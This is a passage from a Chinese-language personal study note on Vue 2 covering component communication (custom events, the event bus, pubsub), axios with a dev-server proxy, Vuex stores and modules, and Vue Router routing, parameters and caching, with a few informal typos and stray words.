    </div>
</template>

<script>
    import Student from './components/Student.vue'
    import School from './components/School.vue'

    export default {
        name:'App',
        components: { Student,School },
    }
</script>
```

**总结：**

`scoped`样式：

1. 作用：让样式在局部生效，防止冲突
2. 写法：`<style scoped>`

> `scoped`样式一般不会在`App.vue`中使用







Reduce用法：

![image-20231201005749240](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231201005749240.png)

```vue
this.todos.reduce((pre,todo) => pre + (todo.done ? 1 : 0),0)
```

最后一个0为初始值，当进行第二次循环的时候，pre就会变成上一次的返回值

### 022.8 WebStorage

总结：

存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

浏览器端通过Window.sessionStorage和Window.localStorage属性来实现本地存储机制

相关API：

xxxStorage.setItem('key', 'value')：该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值
xxxStorage.getItem('key')：该方法接受一个键名作为参数，返回键名对应的值
xxxStorage.removeItem('key')：该方法接受一个键名作为参数，并把该键名从存储中删除
xxxStorage.clear()：该方法会清空存储中的所有数据
备注：

SessionStorage存储的内容会随着浏览器窗口关闭而消失
LocalStorage存储的内容，需要手动清除才会消失
xxxStorage.getItem(xxx)如果 xxx 对应的 value 获取不到，那么getItem()的返回值是null
JSON.parse(null)的结果依然是null

### 022.9 自定义事件

组件的自定义事件：

一种组件间通信的方式，适用于：==子组件 > 父组件

使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）

绑定自定义事件：

第一种方式，在父组件中：<Demo @atguigu="test"/> 或 <Demo v-on:atguigu="test"/>

```vue
<template>
  <div>
    <h1>{{msg}}</h1>
<!--    父组件给子组件传送函数类型-->
    <SchoolComponent :getSchoolName="getSchoolName"></SchoolComponent>
<!--    通过自定义事件，子给父传递数据-->
    <StudentComponent @zjy="getStudentName"></StudentComponent>

    <!--    2.通过自定义事件，子给父传递数据-->
    <student-component ref="student"></student-component>

  </div>
</template>
```

在子组件当中，就可以不用props进行接受

```vue
export default {
  name:'StudentComponent',
  data() {
    return {
      name:'JOJO',
      age:20
    }
  },
  methods:{
    sendStudentName(){
      // 触发Student组件实例
      this.$emit('zjy',this.name,666,7777,8888)
    }
  }
}
```

第二种方式，在父组件中:

```vue
<!--    2.通过自定义事件，子给父传递数据-->
    <student-component ref="student"></student-component>\

  mounted() {
    setTimeout(() =>{
      this.$refs.student.$on('zjy',this.getStudentName) //绑定自定义事件
    },3000)
  }
```

触发自定义事件：this.$emit('atguigu',数据)

解绑自定义事件：this.$off('atguigu')

组件上也可以绑定原生DOM事件，需要使用native修饰符

注意：通过this.$refs.xxx.$on('atguigu',回调)绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题！



### 022.10 全局事件总线（GlobalEventBus）：

1. 一种组件间通信的方式，适用于任意组件间通信

2. 安装全局事件总线：

3. ```vue
   new Vue({
      	...
      	beforeCreate() {
      		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
      	},
       ...
   }) 
   ```

4. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给`$bus`绑定自定义事件，事件的回调留在A组件自身

   2. ```vue
      export default {
          methods(){
              demo(data){...}
          }
          ...
          mounted() {
              this.$bus.$on('xxx',this.demo)
          }
      }
      ```

      

   3. 1. 提供数据：`this.$bus.$emit('xxx',data)`

   4. 最好在`beforeDestroy`钩子中，用`$off`去解绑当前组件所用到的事件

### 022.11 消息的订阅与发布

消息订阅与发布（pubsub）：

消息订阅与发布是一种组件间通信的方式，适用于任意组件间通信

使用步骤：

安装pubsub：npm i pubsub-js

引入：import pubsub from 'pubsub-js'

接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

```vue
export default {
    methods(){
        demo(data){...}
    }
    ...
    mounted() {
		this.pid = pubsub.subscribe('xxx',this.demo)
    }
}
```

区别：

```vue
  mounted() {
    this.$bus.$on('checkTodo',this.checkTodo)
    this.$bus.$on('deleteTodo',this.deleteTodo)
  },
```

1. 提供数据：`pubsub.publish('xxx',data)`
2. 最好在`beforeDestroy`钩子中，使用`pubsub.unsubscribe(pid)`取消订阅

### 022.12 $nextTick

1. 语法：`this.$nextTick(回调函数)`
2. 作用：在下一次 DOM 更新结束后执行其指定的回调
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行

### 022.13 过渡与动画

总结：

Vue封装的过度与动画：

作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名
图示：
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-F7tX8Utw-1648820283412)(https://cn.vuejs.org/images/transition.png)]

写法：

准备好样式：

元素进入的样式：

v-enter：进入的起点
v-enter-active：进入过程中
v-enter-to：进入的终点
元素离开的样式：

v-leave：离开的起点
v-leave-active：离开过程中
v-leave-to：离开的终点
使用`<transition>`包裹要过度的元素，并配置name属性：

```vue
<transition name="hello">
	<h1 v-show="isShow">你好啊！</h1>
</transition>

```

1. 备注：若有多个元素需要过度，则需要使用：`<transition-group>`，且每个元素都要指定`key`值

### 023.1 Vue中Ajax

下载 Axios : npm install axios

vue.config.js:

```js
module.exports = {
    pages: {
        index: {
            entry: 'src/main.js',
        },
    },
    lintOnSave:false,
    // 开启代理服务器（方式一）
    // devServer: {
    //     proxy:'http://localhost:5000'
    // }

    //开启代理服务器（方式二）
	devServer: {
        proxy: {
            '/jojo': {
                target: 'http://localhost:5000',
                pathRewrite:{'^/jojo':''},
                // ws: true, //用于支持websocket,默认值为true
                // changeOrigin: true //用于控制请求头中的host值,默认值为true 说谎
            },
            '/atguigu': {
                target: 'http://localhost:5001',
                pathRewrite:{'^/atguigu':''},
                // ws: true, //用于支持websocket,默认值为true
                // changeOrigin: true //用于控制请求头中的host值,默认值为true
            }
        }
    }
}

```

app:

```vue
<template>
    <div id="root">
        <button @click="getStudents">获取学生信息</button><br/>
        <button @click="getCars">获取汽车信息</button>
    </div>
</template>

<script>
    import axios from 'axios'
    
    export default {
        name:'App',
        methods: {
			getStudents(){
				axios.get('http://localhost:8080/jojo/students').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			},
            getCars(){
				axios.get('http://localhost:8080/atguigu/cars').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			}
        }
    }
</script>

```

**总结：**

vue脚手架配置代理服务器：

- 方法一：在`vue.config.js`中添加如下配置：

- ```vue
  devServer:{
      proxy:"http://localhost:5000"
  }
  
  ```

- 说明：

  1. 优点：配置简单，请求资源时直接发给前端即可
  2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理
  3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

  方法二：

  ```vue
  devServer: {
      proxy: {
        	'/api1': { // 匹配所有以 '/api1'开头的请求路径
          	target: 'http://localhost:5000',// 代理目标的基础路径
          	changeOrigin: true,
          	pathRewrite: {'^/api1': ''}
        	},
        	'/api2': { // 匹配所有以 '/api2'开头的请求路径
          	target: 'http://localhost:5001',// 代理目标的基础路径
          	changeOrigin: true,
          	pathRewrite: {'^/api2': ''}
        	}
      }
  }
  
  // changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
  // changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
  
  ```

  说明：

  1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理
  2. 缺点：配置略微繁琐，请求资源时必须加前缀

### 023.2 GitHub案例

重点：

Search

```vue
methods:{
    //使用全局事件总线在组件间传递数据
    searchUsers(){
      this.$bus.$emit('updateListData', {
        isFirst: false,
        isLoading: true,
        errMsg: '',
        users: []
      })
      axios.get(`https://api.github.com/search/users?q=${this.keyword}`)
      .then(res => {
        console.log(res.data.items);
        this.$bus.$emit("updateListData", {
          isLoading: false,
          errMsg: '',
          users: res.data.items
        });
      })
      .catch(e => {
        console.log(`请求失败:${e.message}`)
        this.$bus.$emit("updateListData", {
          isLoading: false,
          errMsg: e.message,
          users: []
        });
      });
    }
  }
```

List: 接受参数

```vue
mounted() {
  this.$bus.$on('updateListData', (dataObj) => {
    // console.log(`我是list，接到了数据data:`, users);
    // this.isFirst = isFirst;
    // this.isLoading = isLoading;
    // this.errMsg = errMsg;
    // this.users = users;
    this.info = { ...this.info, ...dataObj }; // 将info和dataObj的属性展示出来，进行并集
  });
}
```

## VUEX

### 1.概念

**什么是Vuex:专门在 Vue 中实现集中式状态（数据）管理的一个 Vue 插件，对 vue 应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信**

Vue.use(Vuex)

事件总线方法：

![img](https://img-blog.csdnimg.cn/img_convert/d05c9692a5a926cd56d7f1039e8c7df9.png)

Vuex:

![img](https://img-blog.csdnimg.cn/img_convert/9926b14c9364517375b0e96780245dc6.png)

**什么时候用Vuex:**

1. **多个组件依赖于同一状态**
2. **来自不同组件的行为需要变更同一状态**

```vue
下载vuex：npm i vuex // 报错 只能使用Vue3--Vuex4
下载 npm i vuex@3
```

store讲解：

```js
//准备actions对象——响应组件中用户的动作、处理业务逻辑
const actions = {}   // 服务业 
//准备mutations对象——修改state中的数据
const mutations = {}  // 后厨
//准备state对象——保存具体的数据
const state = {}  // 状态--数据
```

![img](https://img-blog.csdnimg.cn/img_convert/11a966479bad6de2bc521d30b90d391f.png)

### 2.**store管理上面的Actions和Mutations和State**

**需要在main.js当中1.import Vuex 2. Vue.use(Vuex)(才能将$store共享) 3. 使用store**

Store:

```js
/**
 * 该文件用于创建vuex中最核心的store
 */

//引入Vuex
import Vuex from 'vuex';
import Vue from "vue";

//使用vuex来集中管理状态,必要
//new store的前提是必须要使用Vuex插件
Vue.use(Vuex);

//创建actions(本质就是对象) 用于响应组件中的动作
const actions = {
    //收到上下文对象(包含commit)和dispatch过来的值
    // increment(context, value){
    //     context.commit('INCREMENT', value);
    // },
    // decrement(context, value){
    //     context.commit('DECREMENT', value);
    // },
    incrementIfOdd(context, value){
        // console.log(`action中的incrementIfOdd被调用`);
        // console.log('处理了一些事情');
        // context.dispatch('demo1', value);
        if(context.state.sum % 2) {
            console.log('@')
            context.commit('INCREMENT',value);
            // context.state.sum += 1;//这样可以实现但是记住本次对状态的改变开发者工具将无法捕获，因为开发者工具是对mutations对话的
        }
    },
    incrementWait(context, value){
        setTimeout(() => {
            context.commit('INCREMENT', value);
        },500)
    },
    // demo1(context, value){
    //     console.log('处理了一些事情---demo1');
    //     context.dispatch('demo2', value);
    // },
    // demo2(context, value){
    //     console.log('在action的demo中完成最终的逻辑');
    //     if(context.state.sum % 2) {
    //         console.log('@')
    //         context.commit('INCREMENT',value);
    //     }
    // }
}

//创建mutations(本质也是对象) 用于修改数据(state)
const mutations = {
    //收到state和要操作数value
    INCREMENT(state, value) {
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    },
}

//准备getters用于加工state，将其共享于各个组件当中
const getters = {
    bigSum(state){
        return state.sum * 10;
    }
}

//准备state(数据) 存储数据
//类似于各个组件里的computed(计算属性),只不过它是共享的
const state = {
    sum: 0,
    school: 'Wust',
    subject: 'Computer Science',
}


//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
});
```

#### 2.1Actions:用于业务逻辑

```js
const actions = {
    //收到上下文对象(包含commit)和dispatch过来的值
    // increment(context, value){
    //     context.commit('INCREMENT', value);
    // },
    // decrement(context, value){
    //     context.commit('DECREMENT', value);
    // },
    incrementIfOdd(context, value){
        // console.log(`action中的incrementIfOdd被调用`);
        // console.log('处理了一些事情');
        // context.dispatch('demo1', value);
        if(context.state.sum % 2) {
            console.log('@')
            context.commit('INCREMENT',value);
            // context.state.sum += 1;//这样可以实现但是记住本次对状态的改变开发者工具将无法捕获，因为开发者工具是对mutations对话的
        }
    }
```

actions中的方法的参数：

dispatch-----》 actions(context,value):

context: $store

value: data

context.commit ----> mutations

#### 2.2 Mutation：底层 操作State

参数（state,value）

### 3.MapActions和MapMutation

```vue
<template>
  <div>
    <h1>当前求和为: {{ sum }}</h1>
    <!--让其收集到的数据全是number类型的 number修饰符-->
    <h3>当前求和放大3倍为:{{ bigSum }}</h3>
    <h3>我在{{ school }}, 学习{{ subject }}</h3>
    <select v-model.number="n">
      <!--让所有的value全部绑定为数字-->
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementIfOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions} from 'vuex';
export default {
  //计数组件
  name: "Count",
  data(){
    return {
      n: 1,// 代表用户在select框开始的时候选择的数字
    }
  },
  computed:{
    //借助mapState从state中生成计算属性,对象写法
    // ... mapState({
    //   sum:'sum',
    //   school: 'school',
    //   subject: 'subject'
    // }),
    //借助mapState从state中生成计算属性,数组写法(即代表了生成的计算属性名为sum，同时也代表了从state找到sum)
    ... mapState(['sum', 'school', 'subject']),

    //借助mapGetters从getters中生成计算属性,对象写法
    // ...mapGetters({ bigSum: 'bigSum' }),
    //借助mapGetters从getters中生成计算属性,数组写法
    ...mapGetters(['bigSum']),

  },
  methods:{
    // increment(){
    //   this.$store.commit('INCREMENT', this.n);
    // },
    // decrement(){
    //   this.$store.commit('DECREMENT', this.n);
    // },
    //借助mapMutations生成对应方法，方法会调用commit去联系mutations，对象写法
    ...mapMutations({
      increment: 'INCREMENT',
      decrement: 'DECREMENT',
    }),
    //借助数组写法生成方法,但注意你生成的方法名和mutations里对应的方法名将会一样的
    // ...mapMutations(['increment', 'decrement']),

    // incrementOdd(){
    //   this.$store.dispatch('incrementIfOdd', this.n);
    // },
    // incrementWait(){
    //   this.$store.dispatch('incrementWait', this.n);
    // }

    //借助mapMutations生成对应方法，方法会调用dispatch去联系actions，对象写法
    // ...mapActions({
    //   incrementIfOdd: 'incrementIfOdd',
    //   incrementWait: 'incrementWait',
    // }),

    ...mapActions(['incrementWait', 'incrementIfOdd']), //数组写法,同上
  },
}
</script>

<style scoped>
   button{
     margin-left: 5px;
   }
</style>

```

**总结：**

1. mapActions方法：用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数
2. mapMutations方法：用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数
3. mapState方法：用于帮助我们映射`state`中的数据  computed
4. mapGetters方法：用于帮助我们映射`getters`中的数据  computed

备注：`mapActions`与`mapMutations`使用时，若需要传递参数，则需要在模板中绑定事件时传递好参数，否则参数是事件对象

```vue
	<button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementIfOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
```

### 4.Vuex模块化编程

将store中针对不同组件的store分开 ,需要开启命名空间

```js
//求和功能配置
export default  {
    namespaced: true,  // 开启命名空间
    state:{
        sum: 0,
        school: 'Wust',
        subject: 'Computer Science',
    },
    getters:{
        bigSum(state){
            return state.sum * 10;
        }
    },
    actions:{
        incrementIfOdd(context, value){
            // console.log(`action中的incrementIfOdd被调用`);
            // console.log('处理了一些事情');
            // context.dispatch('demo1', value);
            if(context.state.sum % 2) {
                console.log('@')
                context.commit('INCREMENT',value);
                // context.state.sum += 1;//这样可以实现但是记住本次对状态的改变开发者工具将无法捕获，因为开发者工具是对mutations对话的
            }
        },
        incrementWait(context, value){
            setTimeout(() => {
                context.commit('INCREMENT', value);
            },500)
        },
    },
    mutations:{
        INCREMENT(state, value) {
            state.sum += value;
        },
        DECREMENT(state, value) {
            state.sum -= value;
        },
    }
}
```

Count.vue:

```vue
<template>
  <div>
    <h1>当前求和为: {{ sum }}</h1>
    <!--让其收集到的数据全是number类型的 number修饰符-->
    <h3>当前求和放大3倍为:{{ bigSum }}</h3>
    <h3>我在{{ school }}, 学习{{ subject }}</h3>
    <h3 style="color: red">下方列表的总人数 {{ personList.length }}</h3>
    <select v-model.number="n">
      <!--让所有的value全部绑定为数字-->
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementIfOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions} from 'vuex';
export default {
  //计数组件
  name: "Count",
  data(){
    return {
      n: 1,// 代表用户在select框开始的时候选择的数字
    }
  },
  computed:{
    //借助mapState从state中生成计算属性,对象写法
    // ... mapState({
    //   sum:'sum',
    //   school: 'school',
    //   subject: 'subject'
    // }),
    //借助mapState从state中生成计算属性,数组写法(即代表了生成的计算属性名为sum，同时也代表了从state找到sum)
    ... mapState('count', ['sum', 'subject', 'school']),  需要加上别名
    ...mapState('person', ['personList']),

    //借助mapGetters从getters中生成计算属性,对象写法
    // ...mapGetters({ bigSum: 'bigSum' }),
    //借助mapGetters从getters中生成计算属性,数组写法
    ...mapGetters('count',['bigSum']),

  },
  methods:{
    // increment(){
    //   this.$store.commit('INCREMENT', this.n);
    // },
    // decrement(){
    //   this.$store.commit('DECREMENT', this.n);
    // },
    //借助mapMutations生成对应方法，方法会调用commit去联系mutations，对象写法
    ...mapMutations('count',{
      increment: 'INCREMENT',
      decrement: 'DECREMENT',
    }),
    //借助数组写法生成方法,但注意你生成的方法名和mutations里对应的方法名将会一样的
    // ...mapMutations(['increment', 'decrement']),

    // incrementOdd(){
    //   this.$store.dispatch('incrementIfOdd', this.n);
    // },
    // incrementWait(){
    //   this.$store.dispatch('incrementWait', this.n);
    // }

    //借助mapMutations生成对应方法，方法会调用dispatch去联系actions，对象写法
    // ...mapActions({
    //   incrementIfOdd: 'incrementIfOdd',
    //   incrementWait: 'incrementWait',
    // }),

    ...mapActions('count',['incrementWait', 'incrementIfOdd']), //数组写法,同上
  },
}
</script>

<style scoped>
   button{
     margin-left: 5px;
   }
</style>
```

store.js  加入组件

```js
/**
 * 该文件用于创建vuex中最核心的store
 */

//引入Vuex
import Vuex from 'vuex';
import Vue from "vue";
import count from './count';
import person from './person';

//使用vuex来集中管理状态,必要
//new store的前提是必须要使用Vuex插件
Vue.use(Vuex);


//创建并暴露store
export default new Vuex.Store({
    modules:{
        count,
        person
    }
});
```

## Vue Router路由管理器

### 1.理解：

vue的一个插件，专门用来实现SPA应用

SPA:

1. 单页Web应用（single Page Web Application,SPA）
2. 整个应用只有一个完整的页面
3. 点击页面中的导航连接不会刷新页面，只会做页面的局部更新
4. 数据需要通过ajax请求获取

### 2.路由的理解

1.什么是路由

​	1.一个路由就是一组映射关系（K-V）

​	2.key为路径，value可能是function或者compoent

2.路由的分类

​	1.后端路由

​		1.理解：value就是function，用于处理客户端提交的请求

​		2.工作过程：服务器接受一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据

​	2.前端路由

​		1.理解：value就是component，用于页面展示

​		2.工作过程：当浏览器的路径改变时，对应的组件就会展示

### 3.路由下载

```xml
下载vue-router：npm i vue-router
```

### 4.使用

创建src/router/index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入组件
import Home from '../components/Home'
import About from '../components/About'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home
        }
    ]
})
```

main.js

```js
import Vue from 'vue'
import App from './App.vue'
import VueRouter from 'vue-router'
import router from './router'

Vue.config.productionTip = false
Vue.use(VueRouter)

new Vue({
    el:"#app",
    render: h => h(App),
    router // 使用路由
})
```

App.vue:

```vue
<template>
	<div>
		<div class="row">
			<div class="col-xs-offset-2 col-xs-8">
				<div class="page-header"><h2>Vue Router Demo</h2></div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-2 col-xs-offset-2">
				<div class="list-group">
					<!-- 原始html中我们使用a标签实现页面跳转 -->
					<!-- <a class="list-group-item active" href="./about.html">About</a>
					<a class="list-group-item" href="./home.html">Home</a> -->
					
					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link class="list-group-item" active-class="active" to="/about"> 							About
    				</router-link>
					<router-link class="list-group-item" active-class="active" to="/home">
                        Home
    				</router-link>
				</div>
			</div>
			<div class="col-xs-6">
				<div class="panel">
					<div class="panel-body">
						<!-- 指定组件的呈现位置 -->
						<router-view></router-view>
					</div>
				</div>
			</div>
		</div>
	</div>
</template>

<script>
	export default {
		name:'App',
	}
</script>
```

component：

```vue
<template>
  <h2>我是Home组件的内容</h2>
</template>

<script>
    export default {
        name:'Home'
    }
</script>
```

总结：

1. 安装`vue-router`，命令：`npm i vue-router`

2. 应用插件：`Vue.use(VueRouter)`

3. 编写router配置项：

4. 实现切换（`active-class`可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位：`<router-view></router-view>` 指定组件的呈现位置

   

   

   ##### 注意事项：路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹

   1. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载
   2. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息
   3. 整个应用只有一个router，可以通过组件的`$router`属性获取到



### 5.多级路由

配置路由规则，使用children配置项：

```js
routes:[
	{
		path:'/about',
		component:About,
	},
	{
		path:'/home',
		component:Home,
		children:[ //通过children配置子级路由
			{
				path:'news', //此处一定不要写：/news
				component:News
			},
			{
				path:'message', //此处一定不要写：/message
				component:Message
			}
		]
	}
]
```

跳转（要写完整路径）：`<router-link to="/home/news">News</router-link>`

### 6.query参数

传递参数：

```vue
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
				
<!-- 跳转并携带query参数，to的对象写法 -->
<router-link :to="{
	path:'/home/message/detail',
	query:{
		id:666,
        title:'你好'
	}
}">跳转</router-link>
```

接收参数：

```vue
$route.query.id
$route.query.title
```

### 7.路由的命名：

router/index.js:

```js
path:'message',
                    component:Message,
                    children:[
                        {
                            //name配置项为路由命名
                            name:'zhoujunying',
                            path:'detail',
                            component: detail
                        }
                    ]
```

组件：

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带query参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">
            {{m.title}}
        </router-link>&nbsp;&nbsp; -->

        <!-- 跳转路由并携带query参数，to的对象写法 -->
<!--        <router-link :to="{-->
<!--                    path:'/home/message/detail',-->
<!--                    query:{-->
<!--                        id:m.id,-->
<!--                        title:m.title-->
<!--                    }-->
<!--                }">-->
<!--          {{m.title}}-->
<!--        </router-link>&nbsp;&nbsp;-->
        <router-link :to="{
                    // 用name进行路由的配置
                    name: 'zhoujunying',
                    query:{
                        id:m.id,
                        title:m.title
                    }
                }">
          {{m.title}}
        </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr/>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name:'MessageComponent',
  data(){
    return{
      messageList:[
        {id:'001',title:'消息001'},
        {id:'002',title:'消息002'},
        {id:'003',title:'消息003'}
      ]
    }
  }
}
</script>
```

总结

命名路由：

1. 作用：可以简化路由的跳转

2. 如何使用：

   给路由命名:

   ```js
   {
   	path:'/demo',
   	component:Demo,
   	children:[
   		{
   			path:'test',
   			component:Test,
   			children:[
   				{
                       name:'hello' //给路由命名
   					path:'welcome',
   					component:Hello,
   				}
   			]
   		}
   	]
   }
   
   ```

   

   8.路由的params参数

   router/index.js

   ```js
   //该文件专门用于创建整个应用的路由器
   import VueRouter from "vue-router";
   //引入组件
   import Home from '../pages/Home'
   import About from '../pages/About'
   import News from '../pages/News'
   import Message from '../pages/Message'
   import Detail from '../pages/Detail'
   
   
   //创建并暴露一个路由器
   export default new VueRouter({
       routes:[
           {
               path:'/about',
               component:About
           },
           {
               path:'/home',
               component:Home,
               children:[
                   {
                       path:'news',
                       component:News
                   },
                   {
                       path:'message',
                       component:Message,
                       children:[
                           {
                               name:'xiangqing',
                               path:'detail/:id/:title',//使用占位符声明接收params参数
                               component:Detail
                           }
                       ]
                   }
               ]
           }
       ]
   })
   ```

   组件：

   ```vue
   <template>
       <div>
           <ul>
               <li v-for="m in messageList" :key="m.id">
                   <!-- 跳转路由并携带params参数，to的字符串写法 -->
                   <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">
                       {{m.title}}
                   </router-link>&nbsp;&nbsp; -->
   
                   <!-- 跳转路由并携带params参数，to的对象写法 -->
                   <router-link :to="{
                       name:'xiangqing',
                       params:{
                           id:m.id,
                           title:m.title
                       }
                   }">
                       {{m.title}}
                   </router-link>&nbsp;&nbsp;
               </li>
           </ul>
           <hr/>
           <router-view></router-view>
       </div>
   </template>
   
   <script>
       export default {
           name:'News',
           data(){
               return{
                   messageList:[
                       {id:'001',title:'消息001'},
                       {id:'002',title:'消息002'},
                       {id:'003',title:'消息003'}
                   ]
               }
           }
       }
   </script>
   ```

   组件（子）：

   ```vue
   <template>
       <ul>
           <li>消息编号：{{$route.params.id}}</li>
           <li>消息标题：{{$route.params.title}}</li>
       </ul>
   </template>
   
   <script>
       export default {
           name:'Detail'
       }
   </script>
   ```

   

   与·query的区别：

   将query换成params

   **总结：**

   1. 配置路由，声明接收`params`参数

      - ```js
        {
        	path:'/home',
        	component:Home,
        	children:[
        		{
        			path:'news',
        			component:News
        		},
        		{
        			component:Message,
        			children:[
        				{
        					name:'xiangqing',
        					path:'detail/:id/:title', //使用占位符声明接收params参数
        					component:Detail
        				}
        			]
        		}
        	]
        }
        ```

      

      

      传递参数：

      ```vue
      <!-- 跳转并携带params参数，to的字符串写法 -->
      <router-link :to="/home/message/detail/666/你好">跳转</router-link>
      				
      <!-- 跳转并携带params参数，to的对象写法 -->
      <router-link 
      	:to="{
      		name:'xiangqing',
      		params:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      
      ```

      **[特别注意：特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！]()**

      接收参数：

      ```js
      $route.params.id
      $route.params.title
      ```

      asdasd

      

      ### 9.props传参

      区别：

      router/index.js:

      ```js
      //该文件专门用于创建整个应用的路由器
      import VueRouter from "vue-router";
      //引入组件
      import Home from '../pages/Home'
      import About from '../pages/About'
      import News from '../pages/News'
      import Message from '../pages/Message'
      import Detail from '../pages/Detail'
      
      
      //创建并暴露一个路由器
      export default new VueRouter({
          routes:[
              {
                  path:'/about',
                  component:About
              },
              {
                  path:'/home',
                  component:Home,
                  children:[
                      {
                          path:'news',
                          component:News
                      },
                      {
                          path:'message',
                          component:Message,
                          children:[
                              {
                                  name:'xiangqing',
                                  path:'detail/:id/:title',
                                  component:Detail,
                                  //props的第一种写法，值为对象，该对象中的所有key-value都会以props的形式传给Detail组件。
      							// props:{a:1,b:'hello'}
      
      							//props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件。
      							// props:true
      
      							//props的第三种写法，值为函数
      							props($route){
      								return {
      									id:$route.params.id,
      									title:$route.params.title,
      								}
      							}
                              }
                          ]
                      }
                  ]
              }
          ]
      })
      ```

      区别2：

      props:

      ```vue
      <template>
          <ul>
              <li>消息编号：{{id}}</li>
              <li>消息标题：{{title}}</li>
          </ul>
      </template>
      
      <script>
          export default {
              name:'Detail',
              props:['id','title']
          }
      </script>
      ```

      params:

      ```vue
      <template>
          <ul>
              <li>消息编号：{{$route.params.id}}</li>
              <li>消息标题：{{$route.params.title}}</li>
          </ul>
      </template>
      
      <script>
          export default {
              name:'Detail'
          }
      </script>
      
      ```

      **总结：**

      - 作用：让路由组件更方便的收到参数

      ```js
      {
      	name:'xiangqing',
      	path:'detail/:id',
      	component:Detail,
      
      	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
      	// props:{a:900}
      
      	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
      	// props:true
      	
      	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
      	props(route){
      		return {
      			id:route.query.id,
      			title:route.query.title
      		}
      	}
      }
      ```

### 10.路由跳转replace方法

总结：

作用：控制路由跳转时操作浏览器历史记录的模式
浏览器的历史记录有两种写入方式：push和replace，其中push是追加历史记录，replace是替换当前记录。路由跳转时候默认为push方式
开启replace模式：<router-link replace ...>News</router-link>

### 11.编程式路由

**总结：**

1. 作用：不借助`<router-link>`实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```vue
   this.$router.push({
   	name:'xiangqing',
       params:{
           id:xxx,
           title:xxx
       }
   })
   
   this.$router.replace({
   	name:'xiangqing',
       params:{
           id:xxx,
           title:xxx
       }
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```

   

### 12.缓存路由：

**总结：**

1. 作用：让不展示的路由组件保持挂载，不被销毁

2. 具体编码：

   ```vue
   //缓存一个路由组件
   <keep-alive include="News"> //include中写想要缓存的组件名，不写表示全部缓存
       <router-view></router-view>
   </keep-alive>
   
   //缓存多个路由组件
   <keep-alive :include="['News','Message']"> 
       <router-view></router-view>
   </keep-alive>
   
   ```

   

### 12 actived和deactived 类型生命钩子

组件：

```vue
<template>
    <ul>
        <li :style="{opacity}">欢迎学习vue</li>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                opacity:1
            }
        },
        activated(){
